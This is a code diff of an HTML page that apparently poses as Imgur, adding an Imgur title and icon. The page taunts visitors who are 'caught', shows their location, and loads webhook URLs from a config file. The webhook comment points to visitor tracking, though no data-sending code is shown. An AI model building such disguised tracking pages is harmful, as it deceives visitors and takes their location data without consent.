@@ -2,7 +2,10 @@
 <html>
 
 <head>
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Imgur</title>
+    <link rel="icon" type="image/png" href="assets/imgur.png">
 </head>
 
 <body>
@@ -11,7 +14,7 @@
         style="margin: 0; padding: 0; font-family: Cambria, Cochin, Georgia, Times, 'Times New Roman', serif; background-color: #fefefe">
         <div
             style="width: 100vw; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column;">
-            <img src="mousetrap.gif" width="400">
+            <img src="assets/mousetrap.gif" width="400">
             <h1>Mais um ratão de Imgur capturado! 🤣🤣</h1>
             <h2> <span id="loc"></span></h2>
             <br>
@@ -29,7 +32,7 @@
         // Getting the private and public webhook URLs from config.json
         async function getConfig() {
             try {
-                const response = await fetch('config.json');
+                const response = await fetch('assets/config.json');
                 const config = await response.json();
                 return config;
             } catch (error) {
